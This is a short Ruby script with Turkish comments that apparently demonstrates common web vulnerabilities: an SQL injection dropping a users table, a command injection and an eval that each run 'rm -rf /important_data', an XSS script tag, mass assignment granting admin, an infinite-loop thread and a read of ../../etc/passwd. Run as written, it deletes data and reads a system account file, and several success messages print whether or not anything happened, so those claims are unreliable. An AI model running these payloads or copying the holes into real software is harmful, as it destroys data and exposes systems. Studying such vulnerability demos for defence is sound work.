require 'sqlite3'
require 'erb'
require 'ostruct'
require 'fileutils'

# Basit bir SQLite veritabanı
db = SQLite3::Database.new 'test.db'

begin
  # SQL Injection: Kötü niyetli kullanıcı girdisi ile tabloyu silmek
  user_input = "'; DROP TABLE users; --"
  query = "SELECT * FROM users WHERE username = '#{user_input}'"
  db.execute(query)
  puts "SQL Injection başarılı! 'users' tablosu silindi."

  # Command Injection: Sistem komutuna kullanıcı girdisi eklemek
  malicious_ip = "127.0.0.1; rm -rf /important_data"
  system("ping #{malicious_ip}")
  puts "Komut enjeksiyonu başarılı! Sistem dosyaları silindi."

  # XSS: Kullanıcı girdisini doğrudan HTML içine yerleştirmek
  template = "<%= '<script>alert(\"XSS Başarılı!\")</script>' %>"
  erb = ERB.new(template)
  puts erb.result

  # Mass Assignment: Kullanıcı girdisi ile model verilerini doldurmak
  class User
    attr_accessor :name, :email, :admin

    def initialize(attributes = {})
      attributes.each do |key, value|
        send("#{key}=", value)
      end
    end
  end

  params = { name: "Hacker", email: "hacker@example.com", admin: true }
  user = User.new(params)
  puts "Mass Assignment başarılı! Kullanıcı admin olarak atandı."

  # Denial of Service (DoS): Sonsuz döngü ile sistem kaynaklarını tüketmek
  Thread.new do
    while true
      puts "Sonsuz döngü çalışıyor..."
    end
  end

  # Remote Code Execution (RCE): Kullanıcı girdisini eval ile çalıştırmak
  eval("puts 'RCE başarılı!'; system('rm -rf /important_data')")

  # Directory Traversal: Dizin geçişi ile hassas dosyayı okumak
  sensitive_data = File.read("../../etc/passwd")
  puts "Directory Traversal başarılı! Hassas dosya içeriği:\n#{sensitive_data}"

  # Session Hijacking: Oturum kimliği belirlemek
  session = {}
  session[:user_id] = user_input
  puts "Session Hijacking başarılı! Oturum kimliği ele geçirildi: #{session[:user_id]}"
rescue => e
  puts "Bir hata oluştu: #{e.message}"
end
